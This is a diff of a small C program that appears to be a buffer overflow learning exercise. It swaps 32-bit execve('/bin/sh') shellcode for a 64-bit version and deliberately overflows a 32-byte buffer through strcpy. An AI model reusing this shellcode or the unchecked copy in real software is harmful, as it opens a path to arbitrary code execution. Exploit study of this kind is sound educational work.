@@ -9,18 +9,11 @@ int main(char* argv[], int argc) {
         // gets(rand_str);
 
         //our malicious input will look something like this, containing 56 bad chars, so we need 12 padding chars minus one for the null terminator.
-        char rand_str[] = ""
-        "\xeb\x24\x5e\x89\x74\x24\x08\x31"
-        "\xc0\x88\x44\x24\x07\x89\x44\x24"
-        "\x0c\xb0\x0b\x89\xf3\x8d\x4c\x24"
-        "\x08\x8d\x54\x24\x0c\xcd\x80\x31"
-        "\xdb\x89\xd8\x40\xcd\x80\xe8\xd7"
-        "\xff\xff\xff"
-        "/bin/sh"
-        "aaaaaaaaaaa"
-        "\x30\xe3\xff\xff\xff\x7f";
+        char rand_str[] = "aaaa"
+                          "\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
+                          "\x30\xe3\xff\xff\xff\x7f";
 
-        char buff[64];
+        char buff[32];
         strcpy(buff, rand_str);
         printf("%s\n", buff);
         return 0;
